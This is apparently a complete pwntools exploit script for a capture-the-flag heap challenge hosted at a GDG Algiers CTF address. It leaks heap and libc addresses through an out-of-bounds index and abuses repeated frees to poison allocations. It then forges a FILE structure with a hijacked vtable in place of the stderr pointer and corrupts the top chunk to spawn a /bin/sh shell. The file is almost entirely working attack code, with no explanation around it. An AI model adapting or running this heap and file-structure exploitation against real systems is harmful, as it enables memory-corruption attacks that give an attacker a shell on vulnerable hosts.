from pwn import *
#context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'split-window', '-h']

TARGET = './chall'
HOST = 'pwn.chal.ctf.gdgalgiers.com'
PORT =  1405

elf = ELF(TARGET)
def start():
	if not args.R:
		print("local")
		#return process(TARGET)
		return process(["../lib/ld-2.29.so", TARGET], env={"LD_PRELOAD":"../lib/libc.so.6"})
		# return process(TARGET, stdout=process.PTY, stdin=process.PTY)
	else:
		print("remote")
		return remote(HOST, PORT)

def get_base_address(proc):
	lines = open("/proc/{}/maps".format(proc.pid), 'r').readlines()
	for line in lines :
		if TARGET[2:] in line.split('/')[-1] :
			break
	return int(line.split('-')[0], 16)

def debug(proc, breakpoints):
	script = "handle SIGALRM ignore\n"
	PIE = get_base_address(proc)
	script += "set $base = 0x{:x}\n".format(PIE)
	for bp in breakpoints:
		script += "b *0x%x\n"%(PIE+bp)
	script += "c"
	gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

r = start()
if args.D:
	debug(r, [])

def v(idx):
	r.sendlineafter(b'tion: ', b'4')
	r.sendlineafter(b'dex: ', str(idx).encode())

def d(idx):
	r.sendlineafter(b'tion: ', b'2')
	r.sendlineafter(b'dex: ', str(idx).encode())

def a(si, data):
	r.sendlineafter(b'tion: ', b'1')
	r.sendlineafter(b'Size: ', str(si).encode())
	r.sendafter(b'tent: ', data)

a(0x1f8, b'a')
v(0)
r.recvuntil(b'at: ')
leak = int(r.recv(14), 16)
heap = leak - 0x260
d(0)
dbg('leak')
dbg('heap')
v(-11)
r.recvuntil(b'at: ')
leak = int(r.recv(14), 16)
dbg('leak')
base = leak - 0x47860
dbg('base')
vtable = base + 0x1e6560
system = base + 0x52fd0
binsh = base + 0x1afb84

d(3)
d(3)
payload = b''
payload += flat(0, 0) * 2
payload += flat(0, 0xffffffffffffffff)
payload = payload.ljust(0x80, b'\x00')
payload += flat(0, base+0x1e7ae0) 
payload += flat(0xdead, heap+0x260+0xe0)
payload = payload.ljust(0xa0, b'\x00')
payload += flat(heap+0x260+0xe0, 0)
payload = payload.ljust(0xd0, b'\x00')
payload += flat(0, vtable-0x5a0-0x38)# +0x38: io_wfile_sync
payload += flat(u64(b'/bin/sh\x00'), 0x1111)
payload += flat(0x2222, system+1)
payload += flat(system)

# replace stderr pointer
a(0x1f8, payload)

d(3)
d(3)
a(0x1f8, b'a'*0x1f8)
d(3)
a(0x1f8, b'a'*0x1f8)
d(3)
a(0x1f8, b'a'*0x1f8)
d(3)

# destroy top chunk header
a(0x18, b'a'*0x17)
d(3)
r.sendlineafter(b'tion: ', b'1')
dbg('vtable')
#pause()
r.sendlineafter(b'Size: ', b'1')

r.interactive()
r.close()
